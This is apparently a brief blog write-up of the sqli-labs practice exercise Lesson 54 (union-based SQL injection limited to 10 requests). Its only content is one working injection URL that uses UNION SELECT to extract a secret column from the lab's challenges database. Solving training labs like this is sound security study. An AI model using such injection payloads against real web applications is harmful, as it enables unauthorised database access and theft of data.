---
title: sqli-labs lession-54 GET-Union-变化1-仅允许10次请求
date: 2018-11-21 14:08:44
tags: [sqli-labs]
categories: sql注入
---

# sqli-labs lession-54 GET-Union-变化1-仅允许10次请求

---



`http://10.60.17.35:8082/Less-54/index.php?id=-1'+union+select+1,(select secret_GWX7 from challenges.jwzhjxbnsb limit 0,1),user()%23`

